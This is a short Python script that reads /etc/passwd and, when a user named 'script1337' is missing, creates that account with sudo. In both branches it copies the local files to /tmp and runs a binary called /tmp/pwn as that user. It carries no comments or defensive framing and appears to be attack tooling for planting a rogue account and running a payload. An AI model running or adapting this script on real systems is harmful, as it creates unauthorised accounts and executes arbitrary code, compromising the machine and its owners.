import os

script = "script1337"
f = open("/etc/passwd", "r")
users = str(f.read())
f.close()
if script in users:
    os.system("cp * /tmp")
    os.system("sudo su " + script + " -c /tmp/pwn")
else:
    os.system("sudo useradd " + script)
    os.system("cp * /tmp")
    os.system("sudo su " + script + " -c /tmp/pwn")

